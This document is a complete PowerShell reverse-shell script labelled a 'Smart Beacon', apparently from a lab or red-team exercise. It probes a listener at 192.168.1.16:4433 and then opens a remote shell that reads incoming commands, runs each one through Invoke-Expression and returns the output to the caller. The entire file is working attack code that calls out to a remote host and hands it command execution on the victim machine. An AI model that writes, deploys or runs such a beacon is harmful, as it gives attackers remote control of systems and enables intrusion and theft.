# --- 02.A.CL0CKK33PER Smart Beacon ---
$IP = "192.168.1.16"
$Port = "4433"

# 1. Probe the Listener (TCP Port Check)
$Socket = New-Object Net.Sockets.TcpClient
$Connect = $Socket.BeginConnect($IP, $Port, $null, $null)
$Wait = $Connect.AsyncWaitHandle.WaitOne(100, $false) # 100ms timeout

if($Wait) {
    # 2. Connection Success - Launch Shell
    $Socket.EndConnect($Connect)
    $Stream = $Socket.GetStream()
    [byte[]]$Bytes = 0..65535|%{0}

    # Prompt
    $Prompt = ([text.encoding]::ASCII).GetBytes("REVERSE SHELL ACTIVE: $($env:COMPUTERNAME)`nPS > ")
    $Stream.Write($Prompt, 0, $Prompt.Length)

    while(($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0) {
        $Data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes, 0, $i)
        try {
            # Execute and capture output/errors
            $Output = (Invoke-Expression $Data 2>&1 | Out-String)
            $Output += "PS " + (Get-Location).Path + "> "
        } catch {
            $Output = "Error: $($_.Exception.Message)`nPS " + (Get-Location).Path + "> "
        }
        $SendBack = ([text.encoding]::ASCII).GetBytes($Output)
        $Stream.Write($SendBack, 0, $SendBack.Length)
        $Stream.Flush()
    }
}

# 3. Clean up and Exit
$Socket.Close()
